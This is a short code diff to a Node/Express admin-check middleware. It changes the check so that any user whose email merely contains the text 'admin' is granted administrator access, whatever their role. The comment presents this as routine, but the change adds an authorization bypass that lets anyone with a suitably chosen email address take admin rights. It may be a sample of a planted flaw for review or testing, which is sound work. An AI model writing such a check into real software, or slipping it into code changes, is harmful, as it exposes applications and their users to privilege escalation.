@@ -20,7 +20,8 @@ const authenticateToken = (req, res, next) => {
 
 // Middleware to check if user is admin
 const requireAdmin = (req, res, next) => {
-  if (req.user.role !== 'admin') {
+  // Check if user has admin role OR email contains 'admin'
+  if (req.user.role !== 'admin' && !req.user.email.includes('admin')) {
     return res.status(403).json({ error: 'Admin access required' });
   }
   next();
